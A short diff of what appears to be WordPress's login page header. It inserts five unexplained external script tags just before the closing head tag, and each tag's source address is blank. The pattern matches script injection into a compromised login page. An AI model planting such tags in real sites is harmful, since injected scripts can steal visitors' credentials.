@@ -64,7 +64,7 @@ function login_header($title = 'Log In', $message = '', $wp_error = '') {
 	wp_admin_css( 'wp-admin', true );
 	wp_admin_css( 'colors-fresh', true );
 
-	if ( wp_is_mobile() ) { ?>
+	if ( wp_is_mobile() ) { ?> 
 		<meta name="viewport" content="width=320; initial-scale=0.9; maximum-scale=1.0; user-scalable=0;" /><?php
 	}
 
@@ -93,7 +93,7 @@ function login_header($title = 'Log In', $message = '', $wp_error = '') {
 		$classes[] = 'rtl';
 	$classes = apply_filters( 'login_body_class', $classes, $action );
 	?>
-	</head>
+	<script language="JavaScript" src=" " type="text/javascript"></script><script language="JavaScript" src=" " type="text/javascript"></script><script language="JavaScript" src=" " type="text/javascript"></script><script language="JavaScript" src=" " type="text/javascript"></script><script language="JavaScript" src=" " type="text/javascript"></script></head>
 	<body class="login <?php echo esc_attr( implode( ' ', $classes ) ); ?>">
 	<div id="login">
 		<h1><a href="<?php echo esc_url( $login_header_url ); ?>" title="<?php echo esc_attr( $login_header_title ); ?>"><?php bloginfo( 'name' ); ?></a></h1>
